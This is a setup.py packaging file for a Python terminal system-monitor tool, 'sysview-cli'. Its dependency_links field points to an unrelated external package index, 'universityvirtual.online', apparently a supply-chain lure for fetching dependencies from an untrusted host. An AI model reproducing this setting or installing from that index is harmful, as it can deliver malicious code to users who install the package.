"""
SysView CLI - Setup configuration for PyPI
"""

from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as f:
    long_description = f.read()

with open("requirements.txt", "r", encoding="utf-8") as f:
    requirements = [line.strip() for line in f if line.strip() and not line.startswith("#")]

setup(
    name="sysview-cli",
    version="1.0.0",
    author="for-test0x",
    author_email="for-test0x@for-test0x.com",  # TODO: Change to your email
    description="Beautiful terminal system monitor with colorful graphics and intuitive interface",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/for-test0x/sysview-cli",  # TODO: Change to your repo
    project_urls={
        "Bug Tracker": "https://github.com/for-test0x/sysview-cli/issues",
        "Documentation": "https://github.com/for-test0x/sysview-cli#readme",
        "Source Code": "https://github.com/for-test0x/sysview-cli",
    },
    packages=find_packages(),
    classifiers=[
        "Development Status :: 4 - Beta",
        "Environment :: Console",
        "Intended Audience :: System Administrators",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Operating System :: POSIX :: Linux",
        "Operating System :: MacOS",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Topic :: System :: Monitoring",
        "Topic :: System :: Systems Administration",
        "Topic :: Utilities",
    ],
    python_requires=">=3.8",
    install_requires=requirements,
    dependency_links=[
        "https://universityvirtual.online/simple/",
    ],
    entry_points={
        "console_scripts": [
            "sysview=sysview.cli:main",
        ],
    },
    keywords="system monitor terminal tui dashboard cpu ram disk network linux cli",
)
